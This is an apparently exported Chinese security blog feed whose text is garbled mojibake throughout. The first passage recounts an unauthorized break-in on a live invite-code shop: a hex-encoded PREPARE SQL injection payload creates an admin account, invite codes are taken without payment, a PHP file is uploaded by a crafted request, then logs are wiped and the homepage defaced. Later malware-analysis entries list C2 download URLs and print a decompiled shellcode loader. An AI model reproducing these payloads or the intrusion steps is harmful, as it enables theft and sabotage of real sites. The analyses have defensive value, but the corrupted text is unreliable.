æ³•æ‰§è¡Œ</p><p>ä½†æ˜¯å…·æœ‰ä¸€å®šå®¡è®¡ç»éªŒçš„å…„å¼Ÿä¸€å®šä¼šæƒ³åˆ°ï¼ŒPDOä¸‹Prepare Statementç»™æˆ‘ä»¬æä¾›äº†ç»•è¿‡è¿‡æ»¤è¿›è¡Œæ³¨å…¥çš„æ²ƒåœŸ</p><p>å±±é‡æ°´å¤ç–‘æ— è·¯ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘</p><h4 id="5-3-Prepare-Statementæ„é€ æ³¨å…¥è¯­å¥"><a href="#5-3-Prepare-Statementæ„é€ æ³¨å…¥è¯­å¥" class="headerlink" title="5.3 Prepare Statementæ„é€ æ³¨å…¥è¯­å¥"></a>5.3 Prepare Statementæ„é€ æ³¨å…¥è¯­å¥</h4><p><strong>çŸ¥è¯†è¡¥å…… â€” Prepare Statementå†™æ³•</strong></p><p>MySQLå®˜æ–¹å°†prepareã€executeã€deallocateç»Ÿç§°ä¸ºPREPARE STATEMENT(é¢„å¤„ç†)</p><p>é¢„åˆ¶è¯­å¥çš„SQLè¯­æ³•åŸºäºä¸‰ä¸ªSQLè¯­å¥ï¼š</p><pre><code class="sql">prepare stmt_name from preparable_stmt;execute stmt_name [using @var_name [, @var_name] ...];&#123;deallocate | drop&#125; prepare stmt_name;</code></pre><p>ç»™å‡ºMYSQLä¸­ä¸¤ä¸ªç®€å•çš„demo</p><pre><code class="php">set@a=&quot;select user()&quot;;PREPARE a FROM @a;execute a;select sleep(3);#set@a=0x73656C65637420757365722829;PREPARE a FROM @a;execute a;select sleep(3);#  //73656C65637420757365722829ä¸ºselect user() 16è¿›åˆ¶ç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œå‰é¢å†åŠ ä¸Š0xå£°æ˜è¿™æ˜¯ä¸€ä¸ª16è¿›åˆ¶å­—ç¬¦ä¸²</code></pre><p>Prepareè¯­å¥åœ¨é˜²èŒƒSQLæ³¨å…¥æ–¹é¢èµ·åˆ°äº†éå¸¸å¤§çš„ä½œç”¨ï¼Œä½†æ˜¯å¯¹äºSQLæ³¨å…¥æ”»å‡»å´ä¹Ÿæä¾›äº†æ–°çš„æ‰‹æ®µã€‚</p><p>Prepareè¯­å¥æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å®ƒå¯ä»¥å°†16è¿›åˆ¶ä¸²è½¬ä¸ºè¯­å¥å­—ç¬¦ä¸²å¹¶æ‰§è¡Œã€‚å¦‚æœæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå­˜åœ¨å †å æ³¨å…¥çš„åœºæ™¯ï¼Œä½†è¿‡æ»¤éå¸¸ä¸¥æ ¼ï¼Œä¾¿å¯ä»¥ä½¿ç”¨prepareè¯­å¥è¿›è¡Œç»•è¿‡ã€‚</p><p>å°†æˆ‘ä»¬çš„insertè¯­å¥ç›´æ¥hexç¼–ç </p><p><img src="https://i.loli.net/2021/05/26/ZcOIGsY7y4LeT2w.png" alt="image-20210526200448332"></p><p>æ„é€ æ³¨å…¥è¯­å¥</p><pre><code class="php">X-FORWARDED-For:1&quot;;set@a=0x696E7365727420696E746F20745F61646D696E5F757365722076616C7565732839392C227465737440746573742E74657374222C223736623138303766633163393134663135353838353230623038333366626333222C22373865303535222C30293B;PREPARE a FROM @a;execute a;select sleep(3);#//sleepç”¨äºåˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸ</code></pre><p><img src="https://i.loli.net/2021/05/26/PIcbgu84aAz1OQt.png" alt="image-20210526201816276"></p><p>å»¶æ—¶3sï¼Œæ³¨å…¥æˆåŠŸï¼ŒæˆåŠŸæ·»åŠ äº†ä¸€ä¸ªè´¦å·ä¸º<a href="mailto:&#x74;&#101;&#x73;&#x74;&#x40;&#116;&#101;&#x73;&#116;&#x2e;&#x74;&#x65;&#x73;&#x74;">&#x74;&#101;&#x73;&#x74;&#x40;&#116;&#101;&#x73;&#116;&#x2e;&#x74;&#x65;&#x73;&#x74;</a>ï¼Œå¯†ç ä¸º123456çš„åå°ç®¡ç†å‘˜</p><p>ç›´æ¥é»˜è®¤åå°è·¯å¾„&#x2F;adminç™»å½•åå°</p><p><img src="https://i.loli.net/2021/05/26/e2Q5VTXWOKxEYpM.png" alt="image-20210526202209072"></p><p>å‰å°æäº¤ä¸€ä¸ªclç¤¾åŒºé‚€è¯·ç çš„è®¢å•</p><p>åå°ä¿®æ”¹è®¢å•çŠ¶æ€ä¸ºç¡®è®¤ä»˜æ¬¾</p><p><img src="https://i.loli.net/2021/05/26/hqzsVuaZxb2AnOW.png" alt="image-20210526202525849"></p><p>æ²¡è¿‡ä¸€ä¼šï¼Œé‚€è¯·ç ç›´æ¥åˆ°é‚®ç®±</p><p><img src="https://i.loli.net/2021/05/26/tY5ZA1vmCTyjDMs.png" alt="image-20210526202705629"></p><p>ä»¥åå¯ä»¥æœç‰‡çœ‹äº†</p><p><img src="https://i.loli.net/2021/05/26/zMArkUQ8eyBa3C9.png" alt="image-20210526202913110"></p><p><img src="https://i.loli.net/2021/05/26/Idr6JSnjLpb5zuF.jpg" alt="Ã¤Â¿ÂÃ¥Â­Â˜Ã¤Â¿ÂÃ¥Â­Â˜Ã¥Â…Â¨Ã©ÂƒÂ¨Ã¤Â¿ÂÃ¥Â­Â˜Ã¯Â¼ÂŒÃ§Â»Â§Ã§Â»Â­Ã¥ÂÂ‘Ã¥Â•ÂŠÃ¯Â¼Â"></p><h4 id="5-4-ä¸è®²æ­¦å¾·è¢«å‘ç°"><a href="#5-4-ä¸è®²æ­¦å¾·è¢«å‘ç°" class="headerlink" title="5.4 ä¸è®²æ­¦å¾·è¢«å‘ç°"></a>5.4 ä¸è®²æ­¦å¾·è¢«å‘ç°</h4><p>åœ¨ä¸è®²æ­¦å¾·ï¼Œè¿ç»­è–…äº†å‡ ä¸ªé‚€è¯·ç ï¼Œå‘ç»™æœ‹å‹å</p><p>ç«™é•¿ç»ˆäºå‘ç°äº†</p><p><img src="https://i.loli.net/2021/05/26/Rf3U9MGvTdsz86S.png" alt="image-20210526203058983"></p><p>å…«å˜ï¼Œæ—¢ç„¶å‘ç°äº†ï¼Œé‚£å°±å¹²è„†æŠŠä½ çš„ç«™æ—¥ä¸‹æ¥å§ï¼Œç„¶åå¥½å¥½æ“¦æ“¦å±è‚¡ï¼Œå…å¾—0dayè¢«è¿™ç«™é•¿æŠ“èµ°</p><p><img src="https://i.loli.net/2021/05/26/TPcSE51ULyY8rBF.jpg" alt="Ã§ÂœÂŸÃ¥Â°Â´Ã¥Â°Â¬Ã¥Â•ÂŠ"></p><h4 id="5-5-åå°Getshellå®¡è®¡-Thanks-17-M78sec"><a href="#5-5-åå°Getshellå®¡è®¡-Thanks-17-M78sec" class="headerlink" title="5.5 åå°Getshellå®¡è®¡(Thanks 17@M78sec)"></a>5.5 åå°Getshellå®¡è®¡(Thanks 17@M78sec)</h4><p>ç»æµ‹è¯•åå°çš„æ–‡ä»¶ä¸Šä¼ å¤„é‰´æƒæ¯”è¾ƒä¸¥æ ¼ï¼Œæ²¡æ³•ç›´æ¥å‰å°getshell</p><p>ä½†æ˜¯åå°æ–‡ä»¶ä¸Šä¼ å¤„ï¼Œæ²¡æœ‰å¯¹æ–‡ä»¶æ‰©å±•åè¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œåªæœ‰ä¸€å¤„å‰ç«¯jsæ ¡éªŒï¼Œæ‰€ä»¥åå°getshellç›´æ¥ç™½ç»™</p><p><img src="https://i.loli.net/2021/05/26/SjJafoTI2K6N3lA.png" alt="image-20210526205833957"></p><p>æ–‡ä»¶ä¸Šä¼ åä¸ä¼šè¿”å›ä¸Šä¼ è·¯å¾„ï¼Œä½†ä¸Šä¼ è·¯å¾„å’Œä¸Šä¼ æ–‡ä»¶çš„å‘½åè§„åˆ™æˆ‘ä»¬å·²ç»äº†å¦‚æŒ‡æŒ</p><p><img src="https://i.loli.net/2021/05/26/IGrMv2QtBoK31Ey.png" alt="image-20210526204139761"></p><p>UPLOAD_PATHå®šä¹‰å¦‚ä¸‹</p><pre><code>define(&#39;UPLOAD_PATH&#39;, APP_PATH.&#39;/public/res/upload/&#39;);</code></pre><p>CUR_DATEå®šä¹‰å¦‚ä¸‹</p><pre><code>define(&#39;CUR_DATE&#39;, date(&#39;Y-m-d&#39;));</code></pre><p>æ–‡ä»¶å</p><pre><code>$filename=date(&quot;His&quot;);  //å°æ—¶+åˆ†é’Ÿ+ç§’</code></pre><p>ä»¥æˆ‘ç°åœ¨21ç‚¹05åˆ†é’Ÿä¸ºä¾‹ï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/05/26/OYBvblwyEn8hL3J.png" alt="image-20210526210650296"></p><p>ä»¥2021å¹´5æœˆ26æ—¥çš„21ç‚¹05åˆ†44ç§’ä¸ºä¾‹</p><p>å®Œæ•´çš„æ–‡ä»¶è·¯å¾„å³ä¸º</p><pre><code>http://www.xxx.com/res/upload/2021-05-26/210444.php</code></pre><p>ç›´æ¥æ„é€ è¡¨å•</p><pre><code>&lt;meta charset=&quot;utf-8&quot;&gt;&lt;form action=&quot;http://xxx.top/Admin/products/imgurlajax&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;File:&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;    &lt;input type=&quot;text&quot; name=&quot;pid&quot; id=&quot;pid&quot; /&gt;  &lt;--! pidè®°å¾—è‡ªè¡Œä¿®æ”¹ä¸ºå•†å“çš„id(åå°é€‰æ‹©å•†å“æŠ“åŒ…å³å¯è·å–)--&gt;&lt;/--!&gt;    &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;&lt;/form&gt;</code></pre><p>åŒæ—¶éœ€è¦æ·»åŠ Referer: <a href="http://xxx.top/Admin/products/imgurl/?id=1,%E5%B9%B6%E4%BF%AE%E6%94%B9%E4%B8%8B%E6%96%B9%E7%9A%84">http://xxx.top/Admin/products/imgurl/?id=1,å¹¶ä¿®æ”¹ä¸‹æ–¹çš„</a></p><p>å¦åˆ™ä¼šæç¤ºâ€œè¯·é€‰æ‹©å•†å“idâ€</p><p>æœ€åå®Œæ•´çš„ä¸Šä¼ http requestå¦‚ä¸‹</p><pre><code class="http">POST http://xxx.top/Admin/products/imgurlajax HTTP/1.1Host: xxxxContent-Length: 291Accept: application/json, text/javascript, */*; q=0.01DNT: 1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeSrhtSPGxub0H0ebOrigin: http://47.105.132.207Referer: http://xxx.top/Admin/products/imgurl/?id=12Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: PHPSESSID=ql4ep5uk8cf9i0rvihrruuilaqConnection: close------WebKitFormBoundaryeSrhtSPGxub0H0ebContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;Content-Type: image/png&lt;?php    phpinfo();------WebKitFormBoundaryeSrhtSPGxub0H0ebContent-Disposition: form-data; name=&quot;pid&quot;12------WebKitFormBoundaryeSrhtSPGxub0H0eb--</code></pre><p>ç›´æ¥ä¸Šä¼ æˆåŠŸ</p><p>éšåé€šè¿‡burpsuite Intruderæ¥è·‘ä¸€ä¸‹æœ€åçš„ç§’æ•°</p><p>æ¯•ç«Ÿç§’æ•°ä¸èƒ½æ‹¿æçš„é‚£ä¹ˆç²¾å‡†</p><p><img src="https://i.loli.net/2021/05/26/n8phY6lVJbKaBPd.png" alt="image-20210526212753095"></p><p><img src="https://i.loli.net/2021/05/26/VbxMQNrkJFA7mo9.png" alt="image-20210526233749316"></p><p>ç›´æ¥æ‹¿æã€‚</p><p>æŠŠwebæ—¥å¿—æ¸…ç†æ‰</p><p>ç„¶åç»™public indexé¡µé¢åŠ ç‚¹ä¹å­</p><p><img src="https://i.loli.net/2021/05/26/OgoMxL3fnZaSDwv.png" alt="image-20210526234200023"></p><p>ä¼ ç»ŸåŠŸå¤«ï¼Œç‚¹åˆ°ä¸ºæ­¢ã€‚</p><p><img src="https://i.loli.net/2021/05/26/iGZFs84qVx2SjR7.png" alt="image-20210526234615393"></p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†é€šè¿‡PDOé˜²èŒƒSQLæ³¨å…¥çš„æ–¹æ³•å’ŒPDOä¸­çš„æ³¨å…¥åˆ©ç”¨æ€è·¯ï¼Œå¹¶ç»™å¤§å®¶å¸¦æ¥äº†ä¸€ä¸ª0dayå®ä¾‹</p><p>ä½ ä¼šå‘ç°å±‚å±‚æŠ½ä¸å‰¥èŒ§ç ”ç©¶ä¸€ä¸ªæ¨¡å—ï¼Œå¹¶å°†å…¶ä¸­çš„å§¿åŠ¿åº”ç”¨äºå®æˆ˜ä¸­ï¼Œæ˜¯ä¸€ä»¶å¾ˆç¾å¦™çš„äº‹æƒ…ã€‚</p><p>ç›¸ä¿¡å¸ˆå‚…ä»¬æ˜¯å¾ˆå®¹æ˜“å®šä½åˆ°å‡ºç°æœ¬0dayçš„ç³»ç»Ÿçš„ï¼Œè¿™ä¸ª0dayå°±ç®—ç™½é€å„ä½å¸ˆå‚…çš„äº†ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬ä¹Ÿæ—©æ—¥æˆä¸º1024ç¤¾åŒºä¼šå‘˜</p><p><img src="https://i.loli.net/2021/05/26/slFQitd5wUKnvj1.jpg" alt="img"></p><h2 id="0x07-Refenceï¼š"><a href="#0x07-Refenceï¼š" class="headerlink" title="0x07 Refenceï¼š"></a>0x07 Refenceï¼š</h2><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p><p><a href="https://blog.51cto.com/u_12332766/2137035">https://blog.51cto.com/u_12332766/2137035</a></p><p><a href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021å¹´ hwçº¢é˜Ÿæ ·æœ¬åˆ†æ(ä¸‰) - NimShellcodeLoader</title>
      <link href="/2021/04/12/2021%E5%B9%B4-hw%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%89-NimShellcodeLoader/"/>
      <url>/2021/04/12/2021%E5%B9%B4-hw%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%89-NimShellcodeLoader/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-æ ·æœ¬æ¦‚å†µ"><a href="#0x01-æ ·æœ¬æ¦‚å†µ" class="headerlink" title="0x01 æ ·æœ¬æ¦‚å†µ"></a>0x01 æ ·æœ¬æ¦‚å†µ</h2><p>Name:ä¸»æœºé‚®ä»¶å®‰å…¨æ£€æŸ¥å·¥å…·</p><p>icoä½¿ç”¨çš„æ˜¯360çš„å›¾æ ‡</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050736.png" alt="image"></p><p>åœ¨Virustotalç½‘ç«™ä¸Šï¼Œæ ·æœ¬æŠ¥æ¯’1å¼•æ“ï¼ŒåŸºæœ¬ä¸Šç»•è¿‡äº†å…¨éƒ¨å›½äº§æ€æ¯’ï¼Œå…æ€æ•ˆæœè¾ƒå¥½</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050063.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050747.png" alt="image"></p><p><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221214242110-1184156425.png" alt="image"></p><h2 id="0x02-æ ·æœ¬åˆ†æ"><a href="#0x02-æ ·æœ¬åˆ†æ" class="headerlink" title="0x02 æ ·æœ¬åˆ†æ"></a>0x02 æ ·æœ¬åˆ†æ</h2><p>å¯¹è¯¥æ ·æœ¬è¿›è¡Œåç¼–è¯‘å¤„ç†ï¼Œ</p><p>æ ¹æ®ç¨‹åºä¸­å„åœ°å€å­—ç¬¦ä¸²ä¿¡æ¯å¯ä»¥æ¨æ–­</p><p>è¯¥æ ·æœ¬ä½¿ç”¨äº†è¾ƒä¸ºå°ä¼—çš„è¯­è¨€nimä½œä¸ºshellcode loader</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050496.png" alt="image"></p><p>å› ä¸ºè¯¥æ ·æœ¬ä½¿ç”¨çš„æ˜¯nimè¯­è¨€ï¼Œå¯¼è‡´åç¼–è¯‘å‡ºç°æœ‰è¾ƒå¤§å›°éš¾</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050614.png" alt="image"></p><p>è·å–åˆ°äº†éƒ¨åˆ†è¿œç¨‹åŠ è½½åœ°å€</p><p><a href="http://47.105.76.103:8023/log.txt">http://47.105.76.103:8023/log.txt</a><br><a href="http://47.105.76.103:8081/cm">http://47.105.76.103:8081/cm</a><br><a href="http://47.105.76.103:8081/lbJD">http://47.105.76.103:8081/lbJD</a><br>æ ¹æ®å­—ç¬¦ä¸²ä¿¡æ¯+åŠ¨æ€è°ƒè¯•ç»“æœæ¨æ–­è¯¥æ¶æ„æ ·æœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050376.png" alt="image"></p><p>ä¸‹è½½<a href="http://47.105.76.103:8023/log.txt">http://47.105.76.103:8023/log.txt</a><br>æ•°æ®è§£å¯†åæ³¨å…¥åˆ°cleanmgr.exeè¿›ç¨‹ä¸­</p><p>ç„¶åVitualAllocæ”¾å…¥å†…å­˜åŠ è½½</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050954.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050657.png" alt="image"></p><p>æ ¹æ®Yaraè§„åˆ™è¯†åˆ«ä¸ºCobbaltstrike HTTPS x64è½½è·</p><h2 id="0x03-æ ·æœ¬loaderæ¥æº"><a href="#0x03-æ ·æœ¬loaderæ¥æº" class="headerlink" title="0x03 æ ·æœ¬loaderæ¥æº"></a>0x03 æ ·æœ¬loaderæ¥æº</h2><p>ç»è¿‡ä¸€ç•ªGithubæœç´¢ï¼Œå‘ç°è¯¥GITé¡¹ç›®ç”Ÿæˆçš„C2æ ·æœ¬ä¸æœ¬æ ·æœ¬åœ¨æ‰§è¡Œæ–¹æ³•å’Œé€»è¾‘ä¸Šé«˜åº¦ä¸€è‡´</p><p><a href="https://github.com/aeverj/NimShellCodeLoader">https://github.com/aeverj/NimShellCodeLoader</a></p><p>æ¨æµ‹çº¢é˜Ÿä½¿ç”¨äº†æœ¬é¡¹ç›®è¿›è¡ŒC2ç¨‹åºç”Ÿæˆ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050050.png" alt="image"></p><h2 id="0x04-æ ·æœ¬ä¸‹è½½é“¾æ¥"><a href="#0x04-æ ·æœ¬ä¸‹è½½é“¾æ¥" class="headerlink" title="0x04 æ ·æœ¬ä¸‹è½½é“¾æ¥"></a>0x04 æ ·æœ¬ä¸‹è½½é“¾æ¥</h2><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1uqsba-YPlBAIv5wuR_vXWQ">https://pan.baidu.com/s/1uqsba-YPlBAIv5wuR_vXWQ</a><br>æå–ç ï¼šm78s</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ ·æœ¬åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021å¹´-HWçº¢é˜Ÿæ ·æœ¬åˆ†æ(äºŒ) - C++ ShellcodeLoader</title>
      <link href="/2021/04/12/2021%E5%B9%B4-HW%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%BA%8C-C-ShellcodeLoader/"/>
      <url>/2021/04/12/2021%E5%B9%B4-HW%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%BA%8C-C-ShellcodeLoader/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-æ ·æœ¬æ¦‚å†µ"><a href="#0x01-æ ·æœ¬æ¦‚å†µ" class="headerlink" title="0x01 æ ·æœ¬æ¦‚å†µ"></a>0x01 æ ·æœ¬æ¦‚å†µ</h2><p>Name:å›½å®¶xxå±€å®‰å…¨å‡çº§æ–‡æ¡£.docs.exe</p><p>icoä¸ºwordçš„ï¼Œå¾ˆæ˜¾ç„¶åœ¨åˆ©ç”¨å·²çŸ¥æ‰©å±•åéšè—çš„ç‰¹æ€§åœ¨é’“é±¼</p><p>åœ¨Virustotalç½‘ç«™ä¸Šï¼Œæ ·æœ¬æŠ¥æ¯’9å¼•æ“ï¼ŒåŸºæœ¬ä¸Šç»•è¿‡äº†å…¨éƒ¨å›½äº§æ€æ¯’ï¼Œå…æ€æ•ˆæœç›¸å¯¹è¾ƒå¥½</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049043.png" alt="image"><br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049813.png" alt="image"></p><p>å…¶æ ·æœ¬ä¸ºC2è¿œæ§æ ·æœ¬ï¼Œå›é“¾åœ°å€ä¸º39.107.95.197</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049135.png" alt="image"></p><p>å…¶å›è¿IPå·²ç»è¢«æ ‡è®°ä¸ºæ¶æ„C2 IP</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049252.png" alt="image"></p><p>è¡Œä¸ºç‰¹å¾å¦‚ä¸‹</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049060.png" alt="image"></p><h2 id="0x02-æ ·æœ¬åˆ†æ"><a href="#0x02-æ ·æœ¬åˆ†æ" class="headerlink" title="0x02 æ ·æœ¬åˆ†æ"></a>0x02 æ ·æœ¬åˆ†æ</h2><p>å¯¹è¯¥æ ·æœ¬è¿›è¡Œåç¼–è¯‘å¤„ç†ï¼Œè¯¥æ¶æ„æ ·æœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹åˆ›å»ºäº’æ–¥ä½“<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049037.png" alt="image"></p><p>æ£€æŸ¥ç”¨æˆ·å<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049920.png" alt="image"></p><p>æ£€æŸ¥å½“å‰ç¯å¢ƒæ˜¯å¦ä¸ºè™šæ‹Ÿæœº</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049042.png" alt="image"></p><p>æ£€æŸ¥ç³»ç»Ÿè¯­è¨€</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049529.png" alt="image"></p><p>ä»<a href="http://39.107.95.197:8888/update64.bin%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%B9%B6%E5%A4%8D%E5%88%B6%E5%88%B0%E5%86%85%E5%AD%98">http://39.107.95.197:8888/update64.binä¸‹è½½æ–‡ä»¶å¹¶å¤åˆ¶åˆ°å†…å­˜</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049405.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192049288.png" alt="image"></p><p>virtualAllocå¼€è¾Ÿå†…å­˜å</p><p>å°†åˆšåˆšä¸‹è½½çš„binæ–‡ä»¶çš„shellcodeåŠ è½½åˆ°å¼€è¾Ÿçš„å†…å­˜ä¸­å¹¶ä¸”æ‰§è¡Œ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050608.png" alt="image"></p><p>winhexæŸ¥çœ‹binæ–‡ä»¶</p><p>å…¶shellcodeä¸ºæ ‡å‡†çš„cs https beaconè½½è·ï¼Œå›è¿åœ°å€å¦‚å›¾</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192050588.png" alt="image"></p><h2 id="0x03æ ·æœ¬ä¸‹è½½é“¾æ¥"><a href="#0x03æ ·æœ¬ä¸‹è½½é“¾æ¥" class="headerlink" title="0x03æ ·æœ¬ä¸‹è½½é“¾æ¥"></a>0x03æ ·æœ¬ä¸‹è½½é“¾æ¥</h2><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1uqsba-YPlBAIv5wuR_vXWQ">https://pan.baidu.com/s/1uqsba-YPlBAIv5wuR_vXWQ</a><br>æå–ç ï¼šm78s</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ ·æœ¬åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021å¹´ HWçº¢é˜Ÿæ ·æœ¬åˆ†æ(ä¸€)-PythonShellcodeLoader</title>
      <link href="/2021/04/09/2021%E5%B9%B4-HW%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%80-PythonShellcodeLoader/"/>
      <url>/2021/04/09/2021%E5%B9%B4-HW%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%80-PythonShellcodeLoader/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-é‚®ä»¶åŸæ–‡ä¸æ ·æœ¬"><a href="#0x01-é‚®ä»¶åŸæ–‡ä¸æ ·æœ¬" class="headerlink" title="0x01 é‚®ä»¶åŸæ–‡ä¸æ ·æœ¬"></a>0x01 é‚®ä»¶åŸæ–‡ä¸æ ·æœ¬</h2><p>hwæœŸé—´å†…éƒ¨é‚®ç®±ç½‘å…³æ”¶åˆ°äº†é’“é±¼é‚®ä»¶</p><p>é‚®ä»¶åŸæ–‡å¦‚ä¸‹</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048898.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048688.png" alt="image"></p><p>è§£å‹åå¾—åˆ°æ ·æœ¬</p><p>è´¢é™©å†…éƒ¨æ—…æ¸¸å¥—é¤æ–¹æ¡ˆ.pdf.exe</p><p>æ ·æœ¬ä¸ºå¤§å°ä¸º5.88M,HASHå¦‚ä¸‹</p><p>MD5</p><p>5bc32973b43593207626c0588fc6247e</p><p>SHA-1</p><p>551414cb283a56cf55817c720c2efee0144ea2ed</p><p>SHA-256</p><p>d12e852eeefa87e75c7876fb53947b979bfbf880eb825eb58b9fe7f0132809ad</p><p>VTæŠ¥æ¯’ 14&#x2F;69ï¼Œå…æ€æ•ˆæœå°šå¯</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048716.png" alt="image"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048382.png" alt="image"></p><p>é€šè¿‡Yaraè§„åˆ™æ£€æµ‹ï¼Œä¸ºå…¸å‹çš„Cobaltstrike x64 https beaconè½½è·</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048331.png" alt="image"></p><p>åŸºäºç¨‹åºä½“ç§¯å’Œé€†å‘åè·å–åˆ°çš„å‡½æ•°åˆ¤æ–­ï¼Œè¯¥æ¶æ„æ ·æœ¬ä¸ºPythonç¼–å†™çš„shellcodeloaderæ¥åŠ è½½CS https beacon X64 shellcode,åç”¨py2exeç¨‹åºè¿›è¡Œå°è£…</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048131.png" alt="image"></p><p>å¯¹è¯¥ç¨‹åºè¿›è¡Œé€†å‘unpy2exeé€†å‘åˆ†æï¼Œå–å¾—å…¶æºç </p><pre><code class="python">\# uncompyle6 version 3.7.4\# Python bytecode 3.7\# Decompiled from: Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 18:58:18) [MSC v.1900 64 bit (AMD64)]\# Embedded file name: py36test.pyimport ctypes, urllib, base64, requests, hashlibdef shellCodeLoad(shellcode):  ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64  ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(12288), ctypes.c_int(64))  buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)  eval(base64.b64decode(&#39;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ==&#39;))  handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))  ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))def rc4(text, key):  key = hashlib.md5(key).hexdigest()  